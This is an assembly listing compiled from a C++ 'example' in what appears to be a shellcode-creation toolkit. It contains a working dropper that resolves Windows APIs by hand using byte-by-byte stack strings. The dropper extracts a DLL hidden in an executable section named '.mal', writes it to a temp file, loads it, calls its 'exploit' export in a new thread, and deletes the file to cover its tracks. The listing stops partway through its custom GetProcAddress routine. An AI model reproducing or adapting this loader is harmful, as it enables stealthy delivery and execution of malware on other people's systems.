; Listing generated by Microsoft (R) Optimizing Compiler Version 19.30.30709.0 

	TITLE	C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.obj
	.686P
	.XMM
	;
	.model	flat

;
;


assume fs:nothing
PUBLIC	?m_stricmp@@YAHPAD0@Z				; m_stricmp
PUBLIC	?m_wstricmp@@YAHPA_W0@Z				; m_wstricmp
PUBLIC	?m_memset@@YAXPADDI@Z				; m_memset
PUBLIC	?_GetModuleHandle@@YAPAUHINSTANCE__@@PA_W@Z	; _GetModuleHandle
PUBLIC	?_GetProcAddress@@YAP6GHXZPAUHINSTANCE__@@PBD@Z	; _GetProcAddress
PUBLIC	?GetDataFromSectionName@@YAPAEIPADPAK@Z		; GetDataFromSectionName
PUBLIC	_main
; Function compile flags: /Odtp
_TEXT	SEGMENT
_szTempPath$ = -852					; size = 520
_mWaitForSingleObject$ = -332				; size = 4
_h$ = -328						; size = 4
_hUser32$ = -324					; size = 4
_szJmpTo$ = -320					; size = 4
_mCloseHandle$ = -316					; size = 4
_mInjectedDllBase$ = -312				; size = 4
_mDeleteFileW$ = -308					; size = 4
_mExploit$ = -304					; size = 4
_mCreateThread$ = -300					; size = 4
_mGetTempPathW$ = -296					; size = 4
_mGetTempFileNameW$ = -292				; size = 4
_mGetModuleHandleA$ = -288				; size = 4
_mCreateFileW$ = -284					; size = 4
_mWriteFile$ = -280					; size = 4
_wszKernel$ = -276					; size = 26
_szUser32$ = -248					; size = 22
_szJIT$ = -224						; size = 8
_dwBase$ = -216						; size = 4
_mLoadLibraryW$ = -212					; size = 4
_hDLL$ = -208						; size = 4
_lpDllData$ = -204					; size = 4
_dwNumberOfBytes$ = -200				; size = 4
_szWaitForSingleObject$ = -196				; size = 20
_szGetTempFileNameW$ = -176				; size = 17
_szGetModuleHandleA$ = -156				; size = 17
_szGetProcAddress$ = -136				; size = 15
_szGetTempPathW$ = -120					; size = 13
_szLoadLibraryW$ = -104					; size = 13
_szCreateThread$ = -88					; size = 13
_szCreateFileW$ = -72					; size = 12
_szCloseHandle$ = -60					; size = 12
_szDeleteFileW$ = -48					; size = 12
_szWriteFile$ = -36					; size = 10
_szExploit$ = -24					; size = 8
_szSectionName$ = -16					; size = 5
_mGetProcAddress$ = -8					; size = 4
_hKernelModule$ = -4					; size = 4
_main	PROC
; File C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.cpp
; Line 251
	push	ebp
	mov	ebp, esp
	sub	esp, 852				; 00000354H
; Line 252
	mov	DWORD PTR _szJmpTo$[ebp], 0
; Line 253
	mov	BYTE PTR _szSectionName$[ebp], 46	; 0000002eH
	mov	BYTE PTR _szSectionName$[ebp+1], 109	; 0000006dH
	mov	BYTE PTR _szSectionName$[ebp+2], 97	; 00000061H
	mov	BYTE PTR _szSectionName$[ebp+3], 108	; 0000006cH
	mov	BYTE PTR _szSectionName$[ebp+4], 0
; Line 254
	mov	BYTE PTR _szExploit$[ebp], 101		; 00000065H
	mov	BYTE PTR _szExploit$[ebp+1], 120	; 00000078H
	mov	BYTE PTR _szExploit$[ebp+2], 112	; 00000070H
	mov	BYTE PTR _szExploit$[ebp+3], 108	; 0000006cH
	mov	BYTE PTR _szExploit$[ebp+4], 111	; 0000006fH
	mov	BYTE PTR _szExploit$[ebp+5], 105	; 00000069H
	mov	BYTE PTR _szExploit$[ebp+6], 116	; 00000074H
	mov	BYTE PTR _szExploit$[ebp+7], 0
; Line 257
	mov	eax, 107				; 0000006bH
	mov	WORD PTR _wszKernel$[ebp], ax
	mov	ecx, 101				; 00000065H
	mov	WORD PTR _wszKernel$[ebp+2], cx
	mov	edx, 114				; 00000072H
	mov	WORD PTR _wszKernel$[ebp+4], dx
	mov	eax, 110				; 0000006eH
	mov	WORD PTR _wszKernel$[ebp+6], ax
	mov	ecx, 101				; 00000065H
	mov	WORD PTR _wszKernel$[ebp+8], cx
	mov	edx, 108				; 0000006cH
	mov	WORD PTR _wszKernel$[ebp+10], dx
	mov	eax, 51					; 00000033H
	mov	WORD PTR _wszKernel$[ebp+12], ax
	mov	ecx, 50					; 00000032H
	mov	WORD PTR _wszKernel$[ebp+14], cx
	mov	edx, 46					; 0000002eH
	mov	WORD PTR _wszKernel$[ebp+16], dx
	mov	eax, 100				; 00000064H
	mov	WORD PTR _wszKernel$[ebp+18], ax
	mov	ecx, 108				; 0000006cH
	mov	WORD PTR _wszKernel$[ebp+20], cx
	mov	edx, 108				; 0000006cH
	mov	WORD PTR _wszKernel$[ebp+22], dx
	xor	eax, eax
	mov	WORD PTR _wszKernel$[ebp+24], ax
; Line 258
	lea	ecx, DWORD PTR _wszKernel$[ebp]
	push	ecx
	call	?_GetModuleHandle@@YAPAUHINSTANCE__@@PA_W@Z ; _GetModuleHandle
	add	esp, 4
	mov	DWORD PTR _hKernelModule$[ebp], eax
; Line 260
	mov	BYTE PTR _szGetProcAddress$[ebp], 71	; 00000047H
	mov	BYTE PTR _szGetProcAddress$[ebp+1], 101	; 00000065H
	mov	BYTE PTR _szGetProcAddress$[ebp+2], 116	; 00000074H
	mov	BYTE PTR _szGetProcAddress$[ebp+3], 80	; 00000050H
	mov	BYTE PTR _szGetProcAddress$[ebp+4], 114	; 00000072H
	mov	BYTE PTR _szGetProcAddress$[ebp+5], 111	; 0000006fH
	mov	BYTE PTR _szGetProcAddress$[ebp+6], 99	; 00000063H
	mov	BYTE PTR _szGetProcAddress$[ebp+7], 65	; 00000041H
	mov	BYTE PTR _szGetProcAddress$[ebp+8], 100	; 00000064H
	mov	BYTE PTR _szGetProcAddress$[ebp+9], 100	; 00000064H
	mov	BYTE PTR _szGetProcAddress$[ebp+10], 114 ; 00000072H
	mov	BYTE PTR _szGetProcAddress$[ebp+11], 101 ; 00000065H
	mov	BYTE PTR _szGetProcAddress$[ebp+12], 115 ; 00000073H
	mov	BYTE PTR _szGetProcAddress$[ebp+13], 115 ; 00000073H
	mov	BYTE PTR _szGetProcAddress$[ebp+14], 0
; Line 261
	lea	edx, DWORD PTR _szGetProcAddress$[ebp]
	push	edx
	mov	eax, DWORD PTR _hKernelModule$[ebp]
	push	eax
	call	?_GetProcAddress@@YAP6GHXZPAUHINSTANCE__@@PBD@Z ; _GetProcAddress
	add	esp, 8
	mov	DWORD PTR _mGetProcAddress$[ebp], eax
; Line 263
	mov	BYTE PTR _szGetModuleHandleA$[ebp], 71	; 00000047H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+1], 101 ; 00000065H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+2], 116 ; 00000074H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+3], 77 ; 0000004dH
	mov	BYTE PTR _szGetModuleHandleA$[ebp+4], 111 ; 0000006fH
	mov	BYTE PTR _szGetModuleHandleA$[ebp+5], 100 ; 00000064H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+6], 117 ; 00000075H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+7], 108 ; 0000006cH
	mov	BYTE PTR _szGetModuleHandleA$[ebp+8], 101 ; 00000065H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+9], 72 ; 00000048H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+10], 97 ; 00000061H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+11], 110 ; 0000006eH
	mov	BYTE PTR _szGetModuleHandleA$[ebp+12], 100 ; 00000064H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+13], 108 ; 0000006cH
	mov	BYTE PTR _szGetModuleHandleA$[ebp+14], 101 ; 00000065H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+15], 65 ; 00000041H
	mov	BYTE PTR _szGetModuleHandleA$[ebp+16], 0
; Line 264
	lea	ecx, DWORD PTR _szGetModuleHandleA$[ebp]
	push	ecx
	mov	edx, DWORD PTR _hKernelModule$[ebp]
	push	edx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mGetModuleHandleA$[ebp], eax
; Line 266
	mov	BYTE PTR _szGetTempPathW$[ebp], 71	; 00000047H
	mov	BYTE PTR _szGetTempPathW$[ebp+1], 101	; 00000065H
	mov	BYTE PTR _szGetTempPathW$[ebp+2], 116	; 00000074H
	mov	BYTE PTR _szGetTempPathW$[ebp+3], 84	; 00000054H
	mov	BYTE PTR _szGetTempPathW$[ebp+4], 101	; 00000065H
	mov	BYTE PTR _szGetTempPathW$[ebp+5], 109	; 0000006dH
	mov	BYTE PTR _szGetTempPathW$[ebp+6], 112	; 00000070H
	mov	BYTE PTR _szGetTempPathW$[ebp+7], 80	; 00000050H
	mov	BYTE PTR _szGetTempPathW$[ebp+8], 97	; 00000061H
	mov	BYTE PTR _szGetTempPathW$[ebp+9], 116	; 00000074H
	mov	BYTE PTR _szGetTempPathW$[ebp+10], 104	; 00000068H
	mov	BYTE PTR _szGetTempPathW$[ebp+11], 87	; 00000057H
	mov	BYTE PTR _szGetTempPathW$[ebp+12], 0
; Line 267
	lea	eax, DWORD PTR _szGetTempPathW$[ebp]
	push	eax
	mov	ecx, DWORD PTR _hKernelModule$[ebp]
	push	ecx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mGetTempPathW$[ebp], eax
; Line 269
	mov	BYTE PTR _szGetTempFileNameW$[ebp], 71	; 00000047H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+1], 101 ; 00000065H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+2], 116 ; 00000074H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+3], 84 ; 00000054H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+4], 101 ; 00000065H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+5], 109 ; 0000006dH
	mov	BYTE PTR _szGetTempFileNameW$[ebp+6], 112 ; 00000070H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+7], 70 ; 00000046H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+8], 105 ; 00000069H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+9], 108 ; 0000006cH
	mov	BYTE PTR _szGetTempFileNameW$[ebp+10], 101 ; 00000065H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+11], 78 ; 0000004eH
	mov	BYTE PTR _szGetTempFileNameW$[ebp+12], 97 ; 00000061H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+13], 109 ; 0000006dH
	mov	BYTE PTR _szGetTempFileNameW$[ebp+14], 101 ; 00000065H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+15], 87 ; 00000057H
	mov	BYTE PTR _szGetTempFileNameW$[ebp+16], 0
; Line 270
	lea	edx, DWORD PTR _szGetTempFileNameW$[ebp]
	push	edx
	mov	eax, DWORD PTR _hKernelModule$[ebp]
	push	eax
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mGetTempFileNameW$[ebp], eax
; Line 272
	mov	BYTE PTR _szCreateFileW$[ebp], 67	; 00000043H
	mov	BYTE PTR _szCreateFileW$[ebp+1], 114	; 00000072H
	mov	BYTE PTR _szCreateFileW$[ebp+2], 101	; 00000065H
	mov	BYTE PTR _szCreateFileW$[ebp+3], 97	; 00000061H
	mov	BYTE PTR _szCreateFileW$[ebp+4], 116	; 00000074H
	mov	BYTE PTR _szCreateFileW$[ebp+5], 101	; 00000065H
	mov	BYTE PTR _szCreateFileW$[ebp+6], 70	; 00000046H
	mov	BYTE PTR _szCreateFileW$[ebp+7], 105	; 00000069H
	mov	BYTE PTR _szCreateFileW$[ebp+8], 108	; 0000006cH
	mov	BYTE PTR _szCreateFileW$[ebp+9], 101	; 00000065H
	mov	BYTE PTR _szCreateFileW$[ebp+10], 87	; 00000057H
	mov	BYTE PTR _szCreateFileW$[ebp+11], 0
; Line 273
	lea	ecx, DWORD PTR _szCreateFileW$[ebp]
	push	ecx
	mov	edx, DWORD PTR _hKernelModule$[ebp]
	push	edx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mCreateFileW$[ebp], eax
; Line 275
	mov	BYTE PTR _szWriteFile$[ebp], 87		; 00000057H
	mov	BYTE PTR _szWriteFile$[ebp+1], 114	; 00000072H
	mov	BYTE PTR _szWriteFile$[ebp+2], 105	; 00000069H
	mov	BYTE PTR _szWriteFile$[ebp+3], 116	; 00000074H
	mov	BYTE PTR _szWriteFile$[ebp+4], 101	; 00000065H
	mov	BYTE PTR _szWriteFile$[ebp+5], 70	; 00000046H
	mov	BYTE PTR _szWriteFile$[ebp+6], 105	; 00000069H
	mov	BYTE PTR _szWriteFile$[ebp+7], 108	; 0000006cH
	mov	BYTE PTR _szWriteFile$[ebp+8], 101	; 00000065H
	mov	BYTE PTR _szWriteFile$[ebp+9], 0
; Line 276
	lea	eax, DWORD PTR _szWriteFile$[ebp]
	push	eax
	mov	ecx, DWORD PTR _hKernelModule$[ebp]
	push	ecx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mWriteFile$[ebp], eax
; Line 278
	mov	BYTE PTR _szCloseHandle$[ebp], 67	; 00000043H
	mov	BYTE PTR _szCloseHandle$[ebp+1], 108	; 0000006cH
	mov	BYTE PTR _szCloseHandle$[ebp+2], 111	; 0000006fH
	mov	BYTE PTR _szCloseHandle$[ebp+3], 115	; 00000073H
	mov	BYTE PTR _szCloseHandle$[ebp+4], 101	; 00000065H
	mov	BYTE PTR _szCloseHandle$[ebp+5], 72	; 00000048H
	mov	BYTE PTR _szCloseHandle$[ebp+6], 97	; 00000061H
	mov	BYTE PTR _szCloseHandle$[ebp+7], 110	; 0000006eH
	mov	BYTE PTR _szCloseHandle$[ebp+8], 100	; 00000064H
	mov	BYTE PTR _szCloseHandle$[ebp+9], 108	; 0000006cH
	mov	BYTE PTR _szCloseHandle$[ebp+10], 101	; 00000065H
	mov	BYTE PTR _szCloseHandle$[ebp+11], 0
; Line 279
	lea	edx, DWORD PTR _szCloseHandle$[ebp]
	push	edx
	mov	eax, DWORD PTR _hKernelModule$[ebp]
	push	eax
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mCloseHandle$[ebp], eax
; Line 281
	mov	BYTE PTR _szLoadLibraryW$[ebp], 76	; 0000004cH
	mov	BYTE PTR _szLoadLibraryW$[ebp+1], 111	; 0000006fH
	mov	BYTE PTR _szLoadLibraryW$[ebp+2], 97	; 00000061H
	mov	BYTE PTR _szLoadLibraryW$[ebp+3], 100	; 00000064H
	mov	BYTE PTR _szLoadLibraryW$[ebp+4], 76	; 0000004cH
	mov	BYTE PTR _szLoadLibraryW$[ebp+5], 105	; 00000069H
	mov	BYTE PTR _szLoadLibraryW$[ebp+6], 98	; 00000062H
	mov	BYTE PTR _szLoadLibraryW$[ebp+7], 114	; 00000072H
	mov	BYTE PTR _szLoadLibraryW$[ebp+8], 97	; 00000061H
	mov	BYTE PTR _szLoadLibraryW$[ebp+9], 114	; 00000072H
	mov	BYTE PTR _szLoadLibraryW$[ebp+10], 121	; 00000079H
	mov	BYTE PTR _szLoadLibraryW$[ebp+11], 87	; 00000057H
	mov	BYTE PTR _szLoadLibraryW$[ebp+12], 0
; Line 282
	lea	ecx, DWORD PTR _szLoadLibraryW$[ebp]
	push	ecx
	mov	edx, DWORD PTR _hKernelModule$[ebp]
	push	edx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mLoadLibraryW$[ebp], eax
; Line 284
	mov	BYTE PTR _szDeleteFileW$[ebp], 68	; 00000044H
	mov	BYTE PTR _szDeleteFileW$[ebp+1], 101	; 00000065H
	mov	BYTE PTR _szDeleteFileW$[ebp+2], 108	; 0000006cH
	mov	BYTE PTR _szDeleteFileW$[ebp+3], 101	; 00000065H
	mov	BYTE PTR _szDeleteFileW$[ebp+4], 116	; 00000074H
	mov	BYTE PTR _szDeleteFileW$[ebp+5], 101	; 00000065H
	mov	BYTE PTR _szDeleteFileW$[ebp+6], 70	; 00000046H
	mov	BYTE PTR _szDeleteFileW$[ebp+7], 105	; 00000069H
	mov	BYTE PTR _szDeleteFileW$[ebp+8], 108	; 0000006cH
	mov	BYTE PTR _szDeleteFileW$[ebp+9], 101	; 00000065H
	mov	BYTE PTR _szDeleteFileW$[ebp+10], 87	; 00000057H
	mov	BYTE PTR _szDeleteFileW$[ebp+11], 0
; Line 285
	lea	eax, DWORD PTR _szDeleteFileW$[ebp]
	push	eax
	mov	ecx, DWORD PTR _hKernelModule$[ebp]
	push	ecx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mDeleteFileW$[ebp], eax
; Line 287
	mov	BYTE PTR _szCreateThread$[ebp], 67	; 00000043H
	mov	BYTE PTR _szCreateThread$[ebp+1], 114	; 00000072H
	mov	BYTE PTR _szCreateThread$[ebp+2], 101	; 00000065H
	mov	BYTE PTR _szCreateThread$[ebp+3], 97	; 00000061H
	mov	BYTE PTR _szCreateThread$[ebp+4], 116	; 00000074H
	mov	BYTE PTR _szCreateThread$[ebp+5], 101	; 00000065H
	mov	BYTE PTR _szCreateThread$[ebp+6], 84	; 00000054H
	mov	BYTE PTR _szCreateThread$[ebp+7], 104	; 00000068H
	mov	BYTE PTR _szCreateThread$[ebp+8], 114	; 00000072H
	mov	BYTE PTR _szCreateThread$[ebp+9], 101	; 00000065H
	mov	BYTE PTR _szCreateThread$[ebp+10], 97	; 00000061H
	mov	BYTE PTR _szCreateThread$[ebp+11], 100	; 00000064H
	mov	BYTE PTR _szCreateThread$[ebp+12], 0
; Line 288
	lea	edx, DWORD PTR _szCreateThread$[ebp]
	push	edx
	mov	eax, DWORD PTR _hKernelModule$[ebp]
	push	eax
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mCreateThread$[ebp], eax
; Line 290
	mov	BYTE PTR _szWaitForSingleObject$[ebp], 87 ; 00000057H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+1], 97 ; 00000061H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+2], 105 ; 00000069H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+3], 116 ; 00000074H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+4], 70 ; 00000046H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+5], 111 ; 0000006fH
	mov	BYTE PTR _szWaitForSingleObject$[ebp+6], 114 ; 00000072H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+7], 83 ; 00000053H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+8], 105 ; 00000069H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+9], 110 ; 0000006eH
	mov	BYTE PTR _szWaitForSingleObject$[ebp+10], 103 ; 00000067H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+11], 108 ; 0000006cH
	mov	BYTE PTR _szWaitForSingleObject$[ebp+12], 101 ; 00000065H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+13], 79 ; 0000004fH
	mov	BYTE PTR _szWaitForSingleObject$[ebp+14], 98 ; 00000062H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+15], 106 ; 0000006aH
	mov	BYTE PTR _szWaitForSingleObject$[ebp+16], 101 ; 00000065H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+17], 99 ; 00000063H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+18], 116 ; 00000074H
	mov	BYTE PTR _szWaitForSingleObject$[ebp+19], 0
; Line 291
	lea	ecx, DWORD PTR _szWaitForSingleObject$[ebp]
	push	ecx
	mov	edx, DWORD PTR _hKernelModule$[ebp]
	push	edx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mWaitForSingleObject$[ebp], eax
; Line 293
	mov	eax, 85					; 00000055H
	mov	WORD PTR _szUser32$[ebp], ax
	mov	ecx, 115				; 00000073H
	mov	WORD PTR _szUser32$[ebp+2], cx
	mov	edx, 101				; 00000065H
	mov	WORD PTR _szUser32$[ebp+4], dx
	mov	eax, 114				; 00000072H
	mov	WORD PTR _szUser32$[ebp+6], ax
	mov	ecx, 51					; 00000033H
	mov	WORD PTR _szUser32$[ebp+8], cx
	mov	edx, 50					; 00000032H
	mov	WORD PTR _szUser32$[ebp+10], dx
	mov	eax, 46					; 0000002eH
	mov	WORD PTR _szUser32$[ebp+12], ax
	mov	ecx, 100				; 00000064H
	mov	WORD PTR _szUser32$[ebp+14], cx
	mov	edx, 108				; 0000006cH
	mov	WORD PTR _szUser32$[ebp+16], dx
	mov	eax, 108				; 0000006cH
	mov	WORD PTR _szUser32$[ebp+18], ax
	xor	ecx, ecx
	mov	WORD PTR _szUser32$[ebp+20], cx
; Line 294
	lea	edx, DWORD PTR _szUser32$[ebp]
	push	edx
	call	DWORD PTR _mLoadLibraryW$[ebp]
	mov	DWORD PTR _hUser32$[ebp], eax
; Line 300
	push	520					; 00000208H
	push	0
	lea	eax, DWORD PTR _szTempPath$[ebp]
	push	eax
	call	?m_memset@@YAXPADDI@Z			; m_memset
	add	esp, 12					; 0000000cH
; Line 302
	mov	ecx, 74					; 0000004aH
	mov	WORD PTR _szJIT$[ebp], cx
	mov	edx, 73					; 00000049H
	mov	WORD PTR _szJIT$[ebp+2], dx
	mov	eax, 84					; 00000054H
	mov	WORD PTR _szJIT$[ebp+4], ax
	xor	ecx, ecx
	mov	WORD PTR _szJIT$[ebp+6], cx
; Line 303
	lea	edx, DWORD PTR _szTempPath$[ebp]
	push	edx
	push	260					; 00000104H
	call	DWORD PTR _mGetTempPathW$[ebp]
; Line 304
	lea	eax, DWORD PTR _szTempPath$[ebp]
	push	eax
	push	0
	lea	ecx, DWORD PTR _szJIT$[ebp]
	push	ecx
	lea	edx, DWORD PTR _szTempPath$[ebp]
	push	edx
	call	DWORD PTR _mGetTempFileNameW$[ebp]
; Line 307
	mov	DWORD PTR _dwNumberOfBytes$[ebp], 0
; Line 308
	push	0
	call	DWORD PTR _mGetModuleHandleA$[ebp]
	mov	DWORD PTR _dwBase$[ebp], eax
; Line 309
	lea	eax, DWORD PTR _dwNumberOfBytes$[ebp]
	push	eax
	lea	ecx, DWORD PTR _szSectionName$[ebp]
	push	ecx
	mov	edx, DWORD PTR _dwBase$[ebp]
	push	edx
	call	?GetDataFromSectionName@@YAPAEIPADPAK@Z	; GetDataFromSectionName
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _lpDllData$[ebp], eax
; Line 310
	cmp	DWORD PTR _lpDllData$[ebp], 0
	jne	SHORT $LN2@main
; Line 311
	mov	eax, 3
	jmp	$LN1@main
$LN2@main:
; Line 313
	push	0
	push	128					; 00000080H
	push	2
	push	0
	push	1
	push	1073741824				; 40000000H
	lea	eax, DWORD PTR _szTempPath$[ebp]
	push	eax
	call	DWORD PTR _mCreateFileW$[ebp]
	mov	DWORD PTR _hDLL$[ebp], eax
; Line 314
	push	0
	lea	ecx, DWORD PTR _dwNumberOfBytes$[ebp]
	push	ecx
	mov	edx, DWORD PTR _dwNumberOfBytes$[ebp]
	push	edx
	mov	eax, DWORD PTR _lpDllData$[ebp]
	push	eax
	mov	ecx, DWORD PTR _hDLL$[ebp]
	push	ecx
	call	DWORD PTR _mWriteFile$[ebp]
; Line 315
	mov	edx, DWORD PTR _hDLL$[ebp]
	push	edx
	call	DWORD PTR _mCloseHandle$[ebp]
; Line 317
	lea	eax, DWORD PTR _szTempPath$[ebp]
	push	eax
	call	DWORD PTR _mLoadLibraryW$[ebp]
	mov	DWORD PTR _mInjectedDllBase$[ebp], eax
; Line 319
	lea	ecx, DWORD PTR _szExploit$[ebp]
	push	ecx
	mov	edx, DWORD PTR _mInjectedDllBase$[ebp]
	push	edx
	call	DWORD PTR _mGetProcAddress$[ebp]
	mov	DWORD PTR _mExploit$[ebp], eax
; Line 323
	lea	eax, DWORD PTR _szTempPath$[ebp]
	push	eax
	call	DWORD PTR _mDeleteFileW$[ebp]
; Line 327
	push	0
	push	0
	push	0
	mov	ecx, DWORD PTR _mExploit$[ebp]
	push	ecx
	push	0
	push	0
	call	DWORD PTR _mCreateThread$[ebp]
	mov	DWORD PTR _h$[ebp], eax
; Line 333
	mov	eax, DWORD PTR _dwBase$[ebp]
; Line 334
	add	eax, DWORD PTR _szJmpTo$[ebp]
; Line 335
	call	eax
; Line 338
	xor	eax, eax
$LN1@main:
; Line 340
	mov	esp, ebp
	pop	ebp
	ret	0
_main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_pImageDosHeader$ = -16					; size = 4
_i$1 = -12						; size = 4
_pImageNTHeaders$ = -8					; size = 4
_pSection$ = -4						; size = 4
_dwBase$ = 8						; size = 4
_lpSectionName$ = 12					; size = 4
_dwSize$ = 16						; size = 4
?GetDataFromSectionName@@YAPAEIPADPAK@Z PROC		; GetDataFromSectionName
; File C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.cpp
; Line 217
	push	ebp
	mov	ebp, esp
	sub	esp, 16					; 00000010H
; Line 218
	mov	eax, DWORD PTR _dwBase$[ebp]
	mov	DWORD PTR _pImageDosHeader$[ebp], eax
; Line 219
	mov	ecx, DWORD PTR _pImageDosHeader$[ebp]
	mov	edx, DWORD PTR _dwBase$[ebp]
	add	edx, DWORD PTR [ecx+60]
	mov	DWORD PTR _pImageNTHeaders$[ebp], edx
; Line 221
	mov	eax, DWORD PTR _pImageNTHeaders$[ebp]
	movzx	ecx, WORD PTR [eax+20]
	mov	edx, DWORD PTR _pImageNTHeaders$[ebp]
	lea	eax, DWORD PTR [edx+ecx+24]
	mov	DWORD PTR _pSection$[ebp], eax
; Line 222
	mov	DWORD PTR _i$1[ebp], 0
	jmp	SHORT $LN4@GetDataFro
$LN2@GetDataFro:
	mov	ecx, DWORD PTR _i$1[ebp]
	add	ecx, 1
	mov	DWORD PTR _i$1[ebp], ecx
	mov	edx, DWORD PTR _pSection$[ebp]
	add	edx, 40					; 00000028H
	mov	DWORD PTR _pSection$[ebp], edx
$LN4@GetDataFro:
	mov	eax, DWORD PTR _pImageNTHeaders$[ebp]
	movzx	ecx, WORD PTR [eax+6]
	cmp	DWORD PTR _i$1[ebp], ecx
	jae	SHORT $LN3@GetDataFro
; Line 224
	mov	edx, DWORD PTR _lpSectionName$[ebp]
	push	edx
	mov	eax, DWORD PTR _pSection$[ebp]
	push	eax
	call	?m_stricmp@@YAHPAD0@Z			; m_stricmp
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN5@GetDataFro
; Line 226
	mov	ecx, DWORD PTR _dwSize$[ebp]
	mov	edx, DWORD PTR _pSection$[ebp]
	mov	eax, DWORD PTR [edx+8]
	mov	DWORD PTR [ecx], eax
; Line 227
	mov	ecx, DWORD PTR _pSection$[ebp]
	mov	eax, DWORD PTR [ecx+12]
	add	eax, DWORD PTR _dwBase$[ebp]
	jmp	SHORT $LN1@GetDataFro
$LN5@GetDataFro:
; Line 229
	jmp	SHORT $LN2@GetDataFro
$LN3@GetDataFro:
; Line 230
	mov	edx, DWORD PTR _dwSize$[ebp]
	mov	DWORD PTR [edx], 0
; Line 231
	xor	eax, eax
$LN1@GetDataFro:
; Line 232
	mov	esp, ebp
	pop	ebp
	ret	0
?GetDataFromSectionName@@YAPAEIPADPAK@Z ENDP		; GetDataFromSectionName
_TEXT	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
_dwAddressOffset$1 = -40				; size = 4
_pAddressTable$2 = -36					; size = 4
_pOrdinalTable$3 = -32					; size = 4
_pNameTable$ = -28					; size = 4
_pImageEntryExportRVA$ = -24				; size = 4
_pImageDosHeader$ = -20					; size = 4
_pImageNTHeaders$ = -16					; size = 4
_pImageExportDirectory$ = -12				; size = 4
_i$4 = -8						; size = 4
_dwModule$ = -4						; size = 4
_hModule$ = 8						; size = 4
_lpName$ = 12						; size = 4
?_GetProcAddress@@YAP6GHXZPAUHINSTANCE__@@PBD@Z PROC	; _GetProcAddress
; File C:\Users\Yoav\Desktop\YoavTools\ShellCodeCreationTools\ShellCodeCreator\example\example.cpp
; Line 183
	push	ebp
	mov	ebp, esp
	sub	esp, 40					; 00000028H
; Line 184
	mov	eax, DWORD PTR _hModule$[ebp]
	mov	DWORD PTR _dwModule$[ebp], eax
; Line 185
	cmp	DWORD PTR _hModule$[ebp], 0
	je	SHORT $LN6@GetProcAdd
	cmp	DWORD PTR _lpName$[ebp], 0
	jne	SHORT $LN5@GetProcAdd
$LN6@GetProcAdd:
; Line 186
	xor	eax, eax
	jmp	$LN1@GetProcAdd
$LN5@GetProcAdd:
; Line 188
	mov	ecx, DWORD PTR _dwModule$[ebp]
	mov	DWORD PTR _pImageDosHeader$[ebp], ecx
; Line 189
	mov	edx, DWORD PTR _pImageDosHeader$[ebp]
	movzx	eax, WORD PTR [edx]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN7@GetProcAdd
; Line 190
	xor	eax, eax
	jmp	$LN1@GetProcAdd
$LN7@GetProcAdd:
; Line 193
	mov	ecx, DWORD PTR _pImageDosHeader$[ebp]
	mov	edx, DWORD PTR _dwModule$[ebp]
	add	edx, DWORD PTR [ecx+60]
	mov	DWORD PTR _pImageNTHeaders$[ebp], edx
; Line 194
	mov	eax, DWORD PTR _pImageNTHeaders$[ebp]
	cmp	DWORD PTR [eax], 17744			; 00004550H
	je	SHORT $LN8@GetProcAdd
; Line 195
	xor	eax, eax
	jmp	$LN1@GetProcAdd
$LN8@GetProcAdd:
; Line 197
	mov	ecx, 8
	imul	edx, ecx, 0
	mov	eax, DWORD PTR _pImageNTHeaders$[ebp]
	cmp	DWORD PTR [eax+edx+120], 0
	jne	SHORT $LN9@GetProcAdd
; Line 198
	xor	eax, eax
	jmp	$LN1@GetProcAdd
$LN9@GetProcAdd:
; Line 200
	mov	ecx, 8
	imul	edx, ecx, 0
